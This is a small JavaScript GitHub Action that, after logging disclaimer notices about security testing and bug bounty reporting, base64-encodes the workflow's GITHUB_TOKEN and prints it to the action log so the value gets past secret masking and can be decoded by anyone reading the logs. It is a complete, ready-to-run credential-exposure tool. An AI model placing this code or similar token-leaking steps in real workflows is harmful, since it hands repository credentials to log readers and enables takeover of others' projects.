const { Toolkit } = require('actions-toolkit')

const NOTICE_MESSAGES = [
  "THIS SHOULD NOT BE USED IN A PRODUCTION ENVIRONMENT",
  "this should be used for testing vulnerabilites involving GH action tokens.",
  "don't run it without permission from the owner.",
  "if you find one, report it over at hackerone.com/github",
  "if you are planning to make an alternative to GitHub Actions using this, please don't.",
  "I, brxxn, am not responsible for any damages that may have been caused."
]

var encode = (token) => {
  if (typeof token !==  "string") {
    return 'token is not string'
  }
  return Buffer.from(token).toString('base64')
}

Toolkit.run(async tools => {
  for (var notice of NOTICE_MESSAGES) {
    tools.log.warn(`notice: ${notice}`);
  }
  var encodedToken = encode(tools.token);
  tools.log.info(`GITHUB_TOKEN: ${encodedToken}`);
  tools.exit.success('successfully logged GH action token. decode it with base64.');
})